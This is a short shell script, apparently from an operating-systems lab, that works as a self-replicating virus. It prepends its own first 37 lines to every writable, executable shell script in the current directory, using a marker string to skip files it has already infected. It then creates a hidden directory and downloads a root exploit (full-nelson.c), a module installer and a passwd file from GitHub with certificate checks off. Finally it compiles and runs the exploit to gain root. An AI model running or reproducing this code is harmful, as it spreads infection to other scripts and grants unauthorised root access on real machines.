#sekjvghkgaksbk
head -n 37 $0>.temp
for file in ./*;do
echo $file
head -n 2 $file>.mm
if grep sekjvghkgaksbk .mm>.mmm;then
echo "infected file and rm .mm"
rm -f .mm;else
if test -f $file;then
echo "test -f"
if test -x $file;then
echo "test -x"
if test -w $file;then
echo "test -w"
if grep -s sh $file>.mmm;then
cat $file>.SAVEE
cat .temp>$file
cat .SAVEE>>$file
fi fi fi fi fi
done
rm -f .temp .SAVEE .mmm .mm

mkdir .hello
cp exploit.sh ./.hello

cd ./.hello
nohup wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/full-nelson.c
nohup wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/hello.c
nohup wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/insmod.sh
nohup wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/Makefile
wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/passwd
rm -f nohup.out

echo "ready to get root"
gcc full-nelson.c -o full-nelson
cd ..
./.hello/full-nelson
